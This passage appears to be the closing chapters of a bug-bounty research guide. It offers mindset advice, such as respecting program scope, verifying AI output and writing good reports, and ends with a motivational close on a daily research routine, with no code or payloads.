- 30 min reading: one Assetnote/watchTowr/Orange Tsai / James Kettle / Frans Rosén post.

## Chapter 22. The mindset traps to avoid

- **Don't out-code yourself.** Your job is *finding* bugs, not implementing exploit dev. Cite ysoserial; don't reinvent.
- **Don't get attached to a target.** If 4 hours of source-grep yield nothing, switch.
- **Don't skip the report.** A great bug poorly reported pays half. Use the structure.
- **Don't ignore "low-severity" classes.** Five lows + an SSRF + an open registration = a critical chain.
- **Don't trust a single AI answer.** Verify the file path / line / payload. AI hallucinates.
- **Don't burn the program.** No data exfil, no destructive payloads, no denial-of-service. Always read scope.

---

## Closing — The compound effect

Every Assetnote post is one bug. They publish ~20 a year. **Compounded over five years that's the world's best-paid security research output.** And each one looks the same up close: curiosity → installer → grep → trace → patch-diff → PoC → publish.

You don't need to be a wizard. You need:
- One target you understand deeply.
- One AI partner that does the heavy code-reading.
- One routine you run every day.
- One report template you reuse.

Go hunt.

---

*Reference: every blog at https://www.assetnote.io/resources/research as of 2026-05-09. See the companion file `BLOG_SUMMARIES.md` for one-page extracts of each post.*
